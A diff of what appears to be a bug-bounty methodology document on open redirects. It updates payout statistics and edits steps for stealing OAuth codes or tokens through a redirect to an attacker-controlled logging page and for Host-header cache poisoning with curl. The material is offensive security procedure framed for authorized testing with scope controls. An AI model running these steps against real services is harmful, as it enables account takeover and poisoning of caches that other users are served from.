@@ -25,8 +25,9 @@ bug lives in the path, where trailing-slash, locale and catch-all routes copy th
 (#469803, $1,200; #52035, $500), and in front-end code that assigns a URL parameter to `location`.
 
 Standalone, the class is cheap. Of the 362 reports, 333 carry no severity rating, 18 are rated low, 9 medium and
-2 high. Where programmes paid for a plain redirect it was $100 to $550 (#749338, #160047, #125003), and most
-current policies list open redirects without impact as out of scope (`docs/07-graveyard.md`: phishing aid only).
+2 high. 52 of the 70 paid reports drew between $100 and $500, which is where a plain redirect sat on programmes
+that accepted one (#160047 and #125003, $500 each), and most current policies list open redirects without impact
+as out of scope (`docs/07-graveyard.md`: phishing aid only).
 The money is in what the redirect carries: script, when a `javascript:` destination reaches a link or a script
 sink (#125791, $3,000; #683298, $1,540; #260744 and #330008, $1,120 each); a credential that rides along with
 the browser, a CSRF token (#49759, $1,400; #50752, $560) or an OAuth code (#3423013, $1,000; #665651, $750;
@@ -650,7 +651,10 @@ target's hosts) → RDR-010 (per host name behind a cache).
   curl -sS "${HDR[@]}" -b "$AJ" "$T/api/me" | head -c 300; echo
   ```
   A token in the fragment is never sent to a server: serve a page at `/rdr008` on a host we control that sends
-  `location.hash` to its own log (OAU-003 has one), and ask for it with `response_type=token`.
+  `location.hash` to its own log (OAU-003 has one), and ask for it with `response_type=token`. When the provider
+  is Google, GitHub, Apple or another third party, steps 2 and 4 go to its public authorize endpoint, a handful of
+  requests exactly as any user's browser sends them for this client; the scope guard blocks that host until the
+  operator lists it as infrastructure, which is the operator's decision, not the hunter's.
 - **Proof:** the provider accepting the forwarder as `redirect_uri` (`accepted.txt`), the `$OOB` log line for
   `/rdr008` carrying the victim's `code=` or `access_token=`, the redemption from our cookie jar, and one identity
   call that names the victim (our own test identity). The victim's part is one click on our link while signed in
@@ -754,8 +758,9 @@ target's hosts) → RDR-010 (per host name behind a cache).
     printf '%-28s | with: %-45s | clean: %-45s | %s\n' "$hv" "$w" "$c" "$(cc "$D/clean.$cb")"; sleep "$W"
   done | tee "$D/results.txt"
   # 2. an absolute request line: some servers build Location from it instead of from Host; then the clean request
-  curl -sS "${HDR[@]}" --request-target "https://$X$P?rdr010rt=1" -o /dev/null -w 'with:  %{http_code} %header{location}\n' "$T$P?rdr010rt=1"; sleep "$W"
-  curl -sS "${HDR[@]}" -o /dev/null -D "$D/clean.rt" -w 'clean: %{http_code} %header{location}\n' "$T$P?rdr010rt=1"; cc "$D/clean.rt"; echo
+  cb="rdr010rt$RANDOM"
+  curl -sS "${HDR[@]}" --request-target "https://$X$P?$cb=1" -o /dev/null -w 'with:  %{http_code} %header{location}\n' "$T$P?$cb=1"; sleep "$W"
+  curl -sS "${HDR[@]}" -o /dev/null -D "$D/clean.rt" -w 'clean: %{http_code} %header{location}\n' "$T$P?$cb=1"; cc "$D/clean.rt"; echo
   ```
   Never send a header from this list without a buster, and do not repeat requests to keep a poisoned entry alive:
   it expires on its own TTL, which the report states.
